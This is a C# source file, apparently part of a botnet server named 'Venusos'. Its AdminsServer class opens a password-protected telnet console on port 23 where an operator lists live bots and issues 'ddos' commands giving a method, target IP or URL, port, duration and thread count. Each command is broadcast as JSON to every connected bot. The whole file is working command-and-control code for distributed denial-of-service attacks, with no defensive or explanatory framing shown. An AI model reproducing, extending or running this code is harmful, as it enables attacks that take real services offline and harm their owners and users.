using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace Venusos_Botnet_Server
{
    public class AdminsServer
    {
        public static void StartListener()
        {
            TcpClient tcpClient = null;
            TcpListener tcpListener = null;
            NetworkStream networkStream = null;
            string password = Tools.GetPassword();

            Console.WriteLine("Telnet console is avaiable on {0}:23", Tools.GetLocalIP());

            while (true)
            {
                try
                {
                    tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
                    tcpListener.Start();

                    int i = 0;
                    string data = "";
                    bool logged = false;
                    byte[] bytes = new byte[256];

                    tcpClient = tcpListener.AcceptTcpClient();
                    networkStream = tcpClient.GetStream();

                    Console.WriteLine("\n [*] New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);

                    if (Tools.IsBlacklisted(tcpClient))
                    {
                        Console.WriteLine("     - IP is blacklisted");
                        tcpClient.Close();
                    }

                    networkStream.Write(Encoding.ASCII.GetBytes("Enter password: "));

                    Task.Run(() =>
                    {
                        Stopwatch timer = new Stopwatch();
                        timer.Start();

                        while (true)
                        {
                            if (logged)
                            {
                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type ping to list active bots or ddos to see ddos command syntax!\n"));
                                break;
                            }
                            else if (timer.Elapsed.TotalSeconds > 5)
                            {
                                Console.WriteLine("     - Password timeout");
                                Tools.BlacklistTcpClient(tcpClient);
                                tcpClient.Close();
                                break;
                            }
                        }

                        timer.Stop();
                    });

                    while ((i = networkStream.Read(bytes)) != 0)
                    {
                        data = Encoding.ASCII.GetString(bytes, 0, i);
                        BotsServer.tcpClients.RemoveAll(x => !x.Connected);

                        if (logged)
                        {
                            if (data[0..4] is "ping")
                            {
                                int alive = 0;

                                foreach (TcpClient bot in BotsServer.tcpClients)
                                {
                                    if (BotsServer.Ping(bot))
                                    {
                                        alive++;
                                        networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive!\n"));
                                    }
                                }

                                networkStream.Write(Encoding.ASCII.GetBytes("\n" + alive + " bots are alive\n"));
                            }
                            else if (data[0..4] is "ddos")
                            {
                                try
                                {
                                    Command command = Tools.CreateCommand(data);
                                    foreach (TcpClient bot in BotsServer.tcpClients)
                                    {
                                        BotsServer.Send(bot, JsonSerializer.Serialize(command));
                                    }
                                }
                                catch (Exception e)
                                {
                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP/URL] [PORT] [DURATION] [THREADS]\n\nErrors:\n" + e.Message));
                                }
                            }
                        }
                        else if (!logged)
                        {
                            if (data == password)
                            {
                                logged = !logged;
                                Console.WriteLine("     + Client connected");
                            }
                        }
                    }
                }
                catch (Exception)
                {

                }

                try
                {
                    networkStream.Close();
                }
                catch { }
                try
                {
                    tcpClient.Close();
                }
                catch { }
                try
                {
                    tcpListener.Stop();
                }
                catch { }

                Console.WriteLine("     - Client disconnected");
            }
        }
    }
}